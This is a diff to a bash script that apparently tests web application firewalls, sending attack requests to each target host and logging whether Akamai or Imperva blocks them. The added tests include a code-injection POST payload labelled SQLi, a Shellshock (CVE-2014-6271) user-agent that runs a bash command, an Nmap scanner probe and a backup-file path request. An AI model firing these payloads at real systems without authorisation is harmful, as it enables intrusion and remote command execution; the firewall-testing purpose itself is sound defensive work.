@@ -83,3 +83,111 @@ lineip=$(dig +short $linehost)
 	fi
 	echo "=========="
 	echo ""
+
+# SQLi 1
+	echo "=========="
+	echo "SQLi 1"
+	echo "Launching SQLi 1 against " $line"/session"
+
+	# Reset the timestamp to the current time and use PST
+	timestamp=$(TZ=":America/Los_Angeles" date)
+
+	if curl -v -s -X POST $line"/engine/preview.php" -A "Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/49.0.2623.112 Safari/537.36" -H 'Pragma: no-cache' -H "Origin: $line" -H 'Accept-Language: en-US,en;q=0.8' -H 'Upgrade-Insecure-Requests: 1' -H 'Content-Type: application/x-www-form-urlencoded' -H 'Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8' -H 'Cache-Control: no-cache' -H 'Referer: $line/login' -H 'Connection: keep-alive' --data "object=1;print(3900*3790);exit" --compressed --stderr - | grep "403 Forbidden" &> /dev/null; then
+    
+    	echo "SQLi 1 completed"
+        echo "Attack Status: Blocked by Akamai"
+        echo -e "$timestamp \t $line \t SQLi 1 \t \t x \t " >> $file
+        
+    elif curl -v -s -X POST $line"/engine/preview.php" -A "Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/49.0.2623.112 Safari/537.36" -H 'Pragma: no-cache' -H "Origin: $line" -H 'Accept-Language: en-US,en;q=0.8' -H 'Upgrade-Insecure-Requests: 1' -H 'Content-Type: application/x-www-form-urlencoded' -H 'Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8' -H 'Cache-Control: no-cache' -H 'Referer: $line/login' -H 'Connection: keep-alive' --data "object=1;print(3900*3790);exit" --compressed --stderr - | grep "Your request has been blocked" &> /dev/null; then
+
+    	echo "SQLi 1 completed"
+        echo "Attack Status: Blocked by Imperva"
+        echo -e "$timestamp \t $line \t SQLi 1 \t x \t \t " >> $file
+	else
+		echo "SQLi 1 completed"
+		echo "Attack Status: Undetected"
+		echo -e "$timestamp \t $line \t SQLi 1 \t \t \t x" >> $file
+	fi
+	echo "=========="
+	echo ""
+	
+# NMAP Scanner
+	echo "=========="
+	echo "NMAP Scanner"
+	echo "Launching NMAP Scanner against " $line"/nmap"
+	
+	# Reset the timestamp to the current time and use PST
+	timestamp=$(TZ=":America/Los_Angeles" date)
+
+	if curl -v -s -A "Mozilla/5.0 (compatible; Nmap Scripting Engine; https://nmap.org/book/nse.html)" $line"/nmap/folder/check1516910621" --stderr - | grep "403 Forbidden" &> /dev/null; then
+
+		echo "NMAP Scanner completed"
+        echo "Attack Status: Blocked by Akamai"
+        echo -e "$timestamp \t $line \t NMAP Scanner \t \t x \t " >> $file
+        
+    elif curl -v -s -A "Mozilla/5.0 (compatible; Nmap Scripting Engine; https://nmap.org/book/nse.html)" $line"/nmap/folder/check1516910621" --stderr - | grep "Your request has been blocked" &> /dev/null; then
+    
+    	echo "NMAP Scanner completed"
+        echo "Attack Status: Blocked by Imperva"
+        echo -e "$timestamp \t $line \t NMAP Scanner \t x \t \t " >> $file
+	else
+		echo "NMAP Scanner completed"
+		echo "Attack Status: Undetected"
+		echo -e "$timestamp \t $line \t NMAP Scanner \t \t \t x" >> $file
+	fi
+	echo "=========="
+	echo ""
+
+# CVE-2014-6271: Bash Remote Command Execution
+	echo "=========="
+	echo "Bash Remote Command Execution"
+	echo "Launching Remote Command Execution against " $line"/cgi-bin"
+	
+	# Reset the timestamp to the current time and use PST
+	timestamp=$(TZ=":America/Los_Angeles" date)
+
+	if curl -v -s -A '() { :;};echo; /bin/bash -c " echo 2014 | md5sum"' $line"/cgi-bin/test-cgi" --stderr - | grep "403 Forbidden" &> /dev/null; then
+
+		echo "Bash Remote Command Execution completed"
+        echo "Attack Status: Blocked by Akamai"
+        echo -e "$timestamp \t $line \t Bash Remote Command Execution \t \t x \t " >> $file
+        
+    elif curl -v -s -A '() { :;};echo; /bin/bash -c " echo 2014 | md5sum"' $line"/cgi-bin/test-cgi" --stderr - | grep "Your request has been blocked" &> /dev/null; then
+    
+    	echo "Bash Remote Command Execution completed"
+        echo "Attack Status: Blocked by Imperva"
+        echo -e "$timestamp \t $line \t Bash Remote Command Execution \t x \t \t " >> $file
+	else
+		echo "Bash Remote Command Execution completed"
+		echo "Attack Status: Undetected"
+		echo -e "$timestamp \t $line \t Bash Remote Command Execution \t \t \t x" >> $file
+	fi
+	echo "=========="
+	echo ""
+
+# Suspicious File Extension Access
+	echo "=========="
+	echo "Suspicious File Extension Access 1"
+	echo "Launching Suspicious File Access 1 against " $line"/"
+	
+	# Reset the timestamp to the current time and use PST
+	timestamp=$(TZ=":America/Los_Angeles" date)
+
+	if curl -v -s -A "Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/49.0.2623.112 Safari/537.36" $line'/nice%%20ports,/trinity.txt.bak' --stderr - | grep "403 Forbidden" &> /dev/null; then
+
+		echo "Suspicious File Extension Access 1 completed"
+        echo "Attack Status: Blocked by Akamai"
+        echo -e "$timestamp \t $line \t Suspicious File Extension Access 1 \t \t x \t " >> $file
+        
+    elif curl -v -s -A "Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/49.0.2623.112 Safari/537.36" $line'/nice%%20ports,/trinity.txt.bak' --stderr - | grep "Your request has been blocked" &> /dev/null; then
+    
+    	echo "Suspicious File Extension Access 1 completed"
+        echo "Attack Status: Blocked by Imperva"
+        echo -e "$timestamp \t $line \t Suspicious File Extension Access 1 \t x \t \t " >> $file
+	else
+		echo "Suspicious File Extension Access 1 completed"
+		echo "Attack Status: Undetected"
+		echo -e "$timestamp \t $line \t Suspicious File Extension Access 1 \t \t \t x" >> $file
+	fi
+	echo "=========="
+	echo ""
